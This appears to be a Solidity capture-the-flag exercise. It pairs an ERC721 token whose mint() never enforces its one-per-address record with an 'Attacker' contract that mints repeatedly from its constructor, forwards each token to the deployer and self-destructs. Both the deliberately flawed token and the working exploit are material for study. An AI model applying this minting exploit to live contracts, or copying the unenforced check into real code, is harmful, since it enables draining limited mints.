//SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

// TODO REMOVE
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

// You may not modify this contract or the openzeppelin contracts
contract NotRareToken is ERC721 {
    mapping(address => bool) private alreadyMinted;

    uint256 private totalSupply;

    constructor() ERC721("NotRareToken", "NRT") {}

    function mint() external {
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        alreadyMinted[msg.sender] = true;
    }
}

contract Attacker {
    constructor(
        address _victim,
        uint256 _firstTokenId,
        uint256 _lastTokenId
    ) {
        unchecked {
            NotRareToken nrt = NotRareToken(_victim);

            nrt.mint();
            for (uint256 i = _firstTokenId + 1; i < _lastTokenId; ++i) {
                nrt.mint();
                nrt.transferFrom(address(this), msg.sender, i);
            }
            nrt.transferFrom(address(this), msg.sender, _firstTokenId);
        }

        selfdestruct(payable(address(0)));
    }
}
